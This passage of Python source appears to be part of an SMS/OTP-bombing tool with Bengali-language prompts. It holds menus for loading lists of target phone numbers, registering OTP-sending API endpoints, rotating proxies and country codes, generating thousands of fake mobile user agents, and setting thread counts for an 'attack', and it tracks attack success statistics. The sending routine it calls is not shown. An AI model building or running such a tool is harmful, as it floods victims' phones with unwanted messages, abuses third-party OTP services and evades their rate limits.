    print(f"\n{Fore.CYAN}  ── OTP API Endpoint Setup ──")
    print(f"{Fore.YELLOW}  API URL ও JSON Payload দিন। 'null' ব্যবহার করুন ফোন নম্বরের জায়গায়।")
    print(f"{Fore.YELLOW}  শেষ হলে 'done' লিখুন।\n")
    print(f"{Fore.WHITE}  উদাহরণ:")
    print(f"{Fore.WHITE}    API: https://api.example.com/send-otp")
    print(f"{Fore.WHITE}    Payload: {Fore.GREEN}{{\"phone\": null, \"action\": \"send\"}}{Fore.WHITE}")
    print(f"{Fore.WHITE}    GET request: {Fore.GREEN}{{\"phone\": null, \"method\": \"GET\"}}{Fore.WHITE}\n")
    
    eps, plds = [], []
    while True:
        url = input(f"{Fore.GREEN}  API URL (or 'done'): {Fore.WHITE}").strip()
        if url.lower() in ("done", "exit", ""):
            if not eps:
                eps = ["https://httpbin.org/post"]
                plds = [{"phone": None, "test": True}]
                print(f"{Fore.YELLOW}  [!] No APIs — demo endpoint added for testing")
            break
        if not url.startswith(("http://", "https://")):
            print(f"{Fore.RED}  [!] Invalid URL")
            continue
        pstr = input(f"{Fore.GREEN}  Payload JSON: {Fore.WHITE}").strip()
        try:
            pld = json.loads(pstr) if pstr else {"phone": None}
            eps.append(url)
            plds.append(pld)
            print(f"{Fore.GREEN}  [✓] Added: {url}")
        except:
            print(f"{Fore.RED}  [!] Invalid JSON. Use format: {{\"phone\": null}}")
    
    cfg["api_endpoints"] = eps
    cfg["api_payloads"] = plds
    save_config(cfg)
    print(f"{Fore.GREEN}  [✓] {len(eps)} API endpoint(s) saved!")

def handle_country_switch(cfg):
    """Configure country code switching"""
    print(f"\n{Fore.CYAN}  ── Country Code Switch ──")
    en = input(f"{Fore.GREEN}  Enable? (y/n): {Fore.WHITE}").strip().lower()
    if en == "y":
        cfg["country_switch"] = True
        codes = input(f"{Fore.GREEN}  Codes (e.g. +880,+91,+1,+966,+971): {Fore.WHITE}").strip()
        cfg["country_codes"] = [c.strip() for c in codes.split(",") if c.strip()]
        print(f"{Fore.GREEN}  [✓] Enabled → {', '.join(cfg['country_codes'])}")
    else:
        cfg["country_switch"] = False
        print(f"{Fore.YELLOW}  [✗] Disabled")
    save_config(cfg)

def handle_ua_manager(cfg):
    """User Agent management menu"""
    while True:
        show_banner()
        print(f"""{Fore.YELLOW}  ╔══════════════════════ UA MANAGER ═══════════════════════╗
  ║                                                           ║
  ║  {Fore.CYAN}[1] 📋 View Custom UAs (from file){Fore.YELLOW}                      ║
  ║  {Fore.CYAN}[2] ➕ Add Custom UA Manually{Fore.YELLOW}                            ║
  ║  {Fore.CYAN}[3] ❌ Remove Custom UA{Fore.YELLOW}                                  ║
  ║  {Fore.CYAN}[4] 🎲 Generate 10 Random UAs (test){Fore.YELLOW}                     ║
  ║  {Fore.CYAN}[5] 🔢 Count Total Possible UAs{Fore.YELLOW}                          ║
  ║  {Fore.CYAN}[6] 📂 Reload Custom UA from File{Fore.YELLOW}                        ║
  ║  {Fore.CYAN}[0] ◀ Back to Main Menu{Fore.YELLOW}                                  ║
  ╚═════════════════════════════════════════════════════════════╝
        """)
        c = input(f"{Fore.GREEN}  ─➤ Choose: {Fore.WHITE}").strip()
        if c == "1":
            uas = load_file(cfg["ua_file"], "custom UA")
            if uas:
                for i, u in enumerate(uas[:30], 1): print(f"  {i:3d}. {u[:80]}...")
                if len(uas) > 30: print(f"  ... {len(uas)-30} more")
            else: print(f"{Fore.YELLOW}  No custom UAs. Auto-generator active (7000+).")
        elif c == "2":
            ua = input(f"{Fore.GREEN}  UA: {Fore.WHITE}").strip()
            if ua:
                with open(cfg["ua_file"], "a") as f: f.write(ua + "\n")
                print(f"{Fore.GREEN}  [✓] Added")
        elif c == "3":
            uas = load_file(cfg["ua_file"])
            if uas:
                for i, u in enumerate(uas[:30], 1): print(f"  {i:3d}. {u[:60]}...")
                try:
                    idx = int(input(f"{Fore.GREEN}  Remove #: {Fore.WHITE}")) - 1
                    if 0 <= idx < len(uas):
                        uas.pop(idx)
                        with open(cfg["ua_file"], "w") as f: f.write("\n".join(uas) + "\n")
                        print(f"{Fore.GREEN}  [✓] Removed")
                except: print(f"{Fore.RED}  [!] Invalid")
        elif c == "4":
            print(f"\n{Fore.CYAN}  10 Random UAs:")
            for i in range(10): print(f"  {i+1:2d}. {get_random_ua()}")
        elif c == "5":
            iCnt = len(IPHONE_MODELS)*len(IOS_VERSIONS)*(len(SAFARI_VERSIONS)+len(CHROME_IOS)+len(FIREFOX_IOS)+3)
            aCnt = (len(SAMSUNG_MODELS)*len(ANDROID_VERSIONS)*(len(CHROME_ANDROID)+len(SAMSUNG_BROWSER)) +
                   len(XIAOMI_MODELS)*len(ANDROID_VERSIONS)*len(CHROME_ANDROID) +
                   len(PIXEL_MODELS)*len(ANDROID_VERSIONS)*len(CHROME_ANDROID) +
                   len(ONEPLUS_MODELS)*len(ANDROID_VERSIONS)*len(CHROME_ANDROID) +
                   len(HUAWEI_MODELS)*len(ANDROID_VERSIONS)*len(CHROME_ANDROID) +
                   len(ANDROID_VERSIONS)*len(FIREFOX_ANDROID)*10)
            print(f"{Fore.GREEN}  iPhone: {iCnt:,}  Android: {aCnt:,}  Total: {iCnt+aCnt:,}+")
        elif c == "6":
            load_file(cfg["ua_file"], "custom UA")
        elif c == "0":
            break
        input(f"\n{Fore.YELLOW}  Press Enter...")

def handle_settings(cfg):
    """Configure attack settings"""
    print(f"\n{Fore.CYAN}  ── Attack Settings ──")
    try:
        t = input(f"{Fore.GREEN}  Threads [{cfg['threads']}]: {Fore.WHITE}").strip()
        if t: cfg["threads"] = max(1, min(200, int(t)))
        d = input(f"{Fore.GREEN}  Delay (sec) [{cfg['delay']}]: {Fore.WHITE}").strip()
        if d: cfg["delay"] = max(0.01, float(d))
        to = input(f"{Fore.GREEN}  Timeout (sec) [{cfg['timeout']}]: {Fore.WHITE}").strip()
        if to: cfg["timeout"] = max(3, int(to))
        r = input(f"{Fore.GREEN}  Max retries [{cfg['max_retries']}]: {Fore.WHITE}").strip()
        if r: cfg["max_retries"] = max(0, int(r))
        print(f"{Fore.GREEN}  [✓] Settings saved")
        save_config(cfg)
    except: print(f"{Fore.RED}  [!] Invalid input")

def handle_proxy_test(proxies_list):
    """Test all proxies for connectivity"""
    if not proxies_list:
        print(f"{Fore.RED}  [!] No proxies to test")
        return proxies_list
    print(f"{Fore.CYAN}  Testing {len(proxies_list)} proxies...")
    working = []
    for i, p in enumerate(proxies_list, 1):
        sys.stdout.write(f"\r{Fore.YELLOW}  Testing {i}/{len(proxies_list)}...")
        sys.stdout.flush()
        try:
            r = requests.get("http://httpbin.org/ip", proxies={"http": p, "https": p}, timeout=5)
            if r.status_code == 200:
                working.append(p)
                print(f"\r{Fore.GREEN}  ✓ [{i}/{len(proxies_list)}] {p}")
        except:
            print(f"\r{Fore.RED}  ✗ [{i}/{len(proxies_list)}] {p}")
    print(f"\n{Fore.GREEN}  [✓] {len(working)}/{len(proxies_list)} working")
    if working:
        with open("proxies.txt", "w") as f: f.write("\n".join(working) + "\n")
        print(f"{Fore.GREEN}  [✓] Updated proxies.txt")
    return working


# ██████████████████████████████████████████████████████████████████████████████
# MAIN LOOP
# ██████████████████████████████████████████████████████████████████████████████

def main():
    """Main entry point"""
    cfg = load_config()
    numbers = load_file(cfg["numbers_file"], "numbers")
    proxies_list = load_file(cfg["proxies_file"], "proxies")
    custom_uas = load_file(cfg["ua_file"], "custom UAs")
    
    while True:
        show_banner()
        show_status(cfg, numbers, proxies_list, custom_uas)
        show_menu()
        
        ch = input(f"{Fore.GREEN}  ─➤ Choose: {Fore.WHITE}").strip().lower()
        
        if ch == "1":
            numbers = load_file(cfg["numbers_file"], "numbers")
        elif ch == "2":
            if numbers:
                print(f"\n{Fore.CYAN}  ── {len(numbers)} Numbers ──")
                for i, n in enumerate(numbers[:80], 1): print(f"  {i:3d}. {n}")
                if len(numbers) > 80: print(f"  ... {len(numbers)-80} more")
            else: print(f"{Fore.RED}  No numbers")
        elif ch == "3":
            n = input(f"{Fore.GREEN}  Number: {Fore.WHITE}").strip()
            if n:
                numbers.append(n)
                with open(cfg["numbers_file"], "a") as f: f.write(n + "\n")
                print(f"{Fore.GREEN}  [✓] Added {n}")
        elif ch == "4":
            proxies_list = load_file(cfg["proxies_file"], "proxies")
        elif ch == "5":
            p = input(f"{Fore.GREEN}  Proxy (http://ip:port): {Fore.WHITE}").strip()
            if p:
                proxies_list.append(p)
                with open(cfg["proxies_file"], "a") as f: f.write(p + "\n")
                print(f"{Fore.GREEN}  [✓] Added proxy")
        elif ch == "6":
            proxies_list = handle_proxy_test(proxies_list)
        elif ch == "7":
            handle_set_apis(cfg)
        elif ch == "8":
            handle_country_switch(cfg)
        elif ch == "9":
            handle_ua_manager(cfg)
            custom_uas = load_file(cfg["ua_file"], "custom UAs")
        elif ch == "10":
            handle_settings(cfg)
        elif ch == "11":
            if numbers:
                sel = input(f"{Fore.GREEN}  Indices (e.g. 1,3,5-10) or 'all': {Fore.WHITE}").strip()
                if sel.lower() != "all":
                    try:
                        selected = []
                        for part in sel.split(","):
                            part = part.strip()
                            if "-" in part:
                                s, e = part.split("-")
                                selected.extend(range(int(s)-1, int(e)))
                            else: selected.append(int(part)-1)
                        numbers = [numbers[i] for i in selected if 0 <= i < len(numbers)]
                    except: print(f"{Fore.RED}  [!] Invalid")
                print(f"{Fore.GREEN}  [✓] {len(numbers)} selected")
            else: print(f"{Fore.RED}  No numbers")
        elif ch == "12":
            print(f"\n{Fore.CYAN}  Modes: 1=Random  2=Sequential  3=No proxy")
            m = input(f"{Fore.GREEN}  Choose: {Fore.WHITE}").strip()
            if m == "1": cfg["rotate_proxy"] = True; cfg["rotate_mode"] = "random"
            elif m == "2": cfg["rotate_proxy"] = True; cfg["rotate_mode"] = "sequential"
            elif m == "3": cfg["rotate_proxy"] = False
            save_config(cfg)
        elif ch == "13":
            total = cfg["request_count"]
            ok = cfg["success_count"]
            fail = cfg["fail_count"]
            print(f"\n{Fore.CYAN}  ── Attack Stats ──")
            print(f"  Total: {total}  Success: {Fore.GREEN}{ok} {Fore.RED}Failed: {fail}")
            if total > 0: print(f"  Rate: {Fore.YELLOW}{ok/total*100:.1f}%{Style.RESET_ALL}")
        elif ch == "14":
            sc = input(f"{Fore.GREEN}  1=Save  2=Load: {Fore.WHITE}").strip()
            if sc == "1": save_config(cfg); print(f"{Fore.GREEN}  [✓] Saved")
            elif sc == "2": cfg = load_config(); print(f"{Fore.GREEN}  [✓] Loaded")
        elif ch == "s":
            start_attack(cfg, numbers, proxies_list, custom_uas)
        elif ch == "x":
            cfg["running"] = False
            print(f"\n{Fore.RED}  🛑 Attack stopped!")
            time.sleep(1)
        elif ch == "0":
            cfg["running"] = False
            print(f"\n{Fore.YELLOW}  Exiting...")
            time.sleep(0.5)
            sys.exit(0)
        else:
            print(f"{Fore.RED}  [!] Invalid option")
        
        if ch not in ("s", "x"):
            input(f"\n{Fore.YELLOW}  Press Enter...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}  [!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}  [!] Error: {e}")
        sys.exit(1)
